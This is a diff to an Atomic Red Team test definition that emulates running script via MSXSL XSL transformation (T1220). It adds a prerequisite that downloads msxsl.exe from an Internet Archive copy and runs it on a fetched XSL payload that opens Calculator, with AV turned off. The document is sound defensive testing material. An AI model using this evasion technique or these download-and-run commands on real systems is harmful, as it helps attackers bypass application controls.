@@ -4,7 +4,9 @@ atomic_tests:
 - name: MSXSL Bypass using local files
   auto_generated_guid: ca23bfb2-023f-49c5-8802-e66997de462d
   description: |
-    Executes the code specified within a XSL script tag during XSL transformation using a local payload. Requires download of MSXSL from Microsoft at https://www.microsoft.com/en-us/download/details.aspx?id=21714. Open Calculator.exe when test sucessfully executed, while AV turned off.
+    Executes the code specified within a XSL script tag during XSL transformation using a local payload. 
+    Requires download of MSXSL from Microsoft (Available via Internet Archive https://web.archive.org/web/20200825011623/https://www.microsoft.com/en-us/download/details.aspx?id=21714 ). 
+    Open Calculator.exe when test sucessfully executed, while AV turned off.
   supported_platforms:
   - windows
   input_arguments:
@@ -32,6 +34,14 @@ atomic_tests:
     get_prereq_command: |
       New-Item -Type Directory (split-path #{xslfile}) -ErrorAction ignore | Out-Null
       Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/msxslscript.xsl" -OutFile "#{xslfile}"
+  - description: |
+      msxsl.exe must exist on disk at specified location (#{msxsl_exe})
+    prereq_command: |
+      if (Test-Path #{msxsl_exe}) {exit 0} else {exit 1}
+    get_prereq_command: |
+      Invoke-WebRequest "https://web.archive.org/web/20200803205229/https://download.microsoft.com/download/f/2/6/f263ac46-1fe9-4ae9-8fd3-21102100ebf5/msxsl.exe" -OutFile "$env:TEMP\msxsl.exe"
+      Copy-Item $env:TEMP\msxsl.exe #{msxsl_exe} -Force
+      Remove-Item $env:TEMP\msxsl.exe
   executor:
     command: |
       C:\Windows\Temp\msxsl.exe #{xmlfile} #{xslfile}
